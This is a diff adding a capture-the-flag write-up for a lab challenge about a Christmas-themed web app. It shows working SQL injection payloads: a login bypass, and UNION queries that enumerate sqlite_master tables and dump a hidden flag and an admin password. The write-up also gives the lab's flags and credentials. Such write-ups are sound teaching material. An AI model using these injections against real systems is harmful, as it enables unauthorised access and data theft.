@@ -344,3 +344,91 @@ curl http://10.10.252.228/api/site-log.php?date=20201125
 ```
 
 Flag: `THM{D4t3_AP1}`
+
+## Day 5: Someone stole Santa's gift list!
+
+*Category: Web Exploitation*  
+*Tags: SQL injection, PHP*  
+
+> Learn to detect and exploit one of the most dangerous web vulnerabilities!
+
+IP: `10.10.220.236`  
+Port: `8000`
+
+### Without using directory brute forcing, what's Santa's secret login panel?
+
+Using the hint, we know that the panel is located at `/santapanel`
+
+![screenshot](day05-someone-stole-santas-gift-list/panel_login.png)
+
+### Bypass the login using SQL injection
+
+Visiting `10.10.220.236:8000/santapanel`, we see there is a login page which I assumed to be vulnerable to SQLi. Therefore, I tried the following payload and sure enough, I was able to gain access to the santapanel
+
+```
+' OR 1==1;--
+```
+
+The full SQL command would then look something like this:
+
+```sql
+SELECT * FROM some_table WHERE username='' OR 1==1;-- AND password='';
+```
+
+As you can see, every entry in this tabble will be returned even if the username doesn't match since 1==1 always evaluates to true.
+
+![screenshot](day05-someone-stole-santas-gift-list/panel_page.png)
+
+### How many entries are there in the gift database?
+
+We can supply a wildcard character (`%`) to select every entry into the database. If we count them, we see that we have 22 entries.
+
+We also see that `Paul` asked for `github ownership`.
+
+### Finding the flag
+
+First we need to find the table names and their schema. We do so using the following SQLi payload to union the tbl_name and sql fields from the sqlite_master table:
+
+```
+%' UNION SELECT tbl_name, sql FROM sqlite_master;--
+```
+Which expands to the following:
+```sql
+SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT tbl_name, sql FROM sqlite_master;--;
+```
+
+We get the following result:
+
+```
+hidden_table | CREATE TABLE hidden_table (flag text)
+sequels | CREATE TABLE sequels (title text, kid text, age integer)
+users | CREATE TABLE users (username text, password text)
+```
+
+To get the flag, we can use the following SQLi payload
+
+```
+%' UNION SELECT 1, flag FROM hidden_table;--
+```
+Which expands to the following:
+```sql
+SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT 1, flag FROM hidden_table;--;
+```
+
+Then we find the flag in the table.
+
+Flag: `thmfox{All_I_Want_for_Christmas_Is_You}`
+
+### Getting the admin password
+
+Once again, we use a SQLi payload.
+
+```
+%' UNION SELECT username, password FROM users;--
+```
+
+In the table we can find the admin's password.
+
+```
+admin:EhCNSWzzFP6sc7gB
+```
